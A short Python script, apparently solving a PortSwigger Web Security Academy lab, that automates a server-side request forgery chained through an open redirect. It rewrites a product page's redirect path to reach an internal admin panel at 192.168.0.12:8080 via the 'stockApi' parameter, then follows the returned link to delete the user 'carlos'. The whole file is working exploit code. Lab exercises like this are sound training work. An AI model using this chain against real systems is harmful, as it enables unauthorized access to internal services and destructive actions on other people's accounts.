import re
import requests
from rich.console import Console
from lxml import html
import urllib.parse

#code_lab = "0abd0005038b31bcc02d155d00a0002f"  # input
SERVER = "https://0a26007904f4251cc039e642001500dd.web-security-academy.net"
console = Console()
response = requests.get(f"{SERVER}/")
html_document = html.fromstring(response.content)
product = html_document.xpath("//section/div/a[contains(@href,'/product?productId=')]/@href")[0]
#console.log(product)
response = requests.get(f"{SERVER}{product}")
#console.log(response.text)
html_document = html.fromstring(response.content)
global_link = str(html_document.xpath("//div[@class='is-linkback']/a[contains(@href,'path=')]/@href"))
link = re.sub(r'path=.*','path=http://192.168.0.12:8080/admin',global_link)
link = link.replace('[\'','')
#console.log(link)
#console.log(urllib.parse.quote(link))
response = requests.post(f"{SERVER}/product/stock", data={
    'stockApi': urllib.parse.quote(link)
})
#console.log(response.text)
html_document = html.fromstring(response.content)
link = str(html_document.xpath("//div/a[contains(@href,'username=carlos')]/@href"))
link = link.replace("/","",1)
link = re.sub(r'path=.*','path='+link,global_link)
link = link.replace("[","").replace("]","").replace("\'","")
#console.log(link)
response = requests.post(f"{SERVER}/product/stock", data={
    'stockApi': urllib.parse.quote(link)
})
#console.log(response.text)
html_document = html.fromstring(response.content)

link = html_document.xpath("//section[@id='notification-labsolver']")
if link is not None:
    console.log('You win')
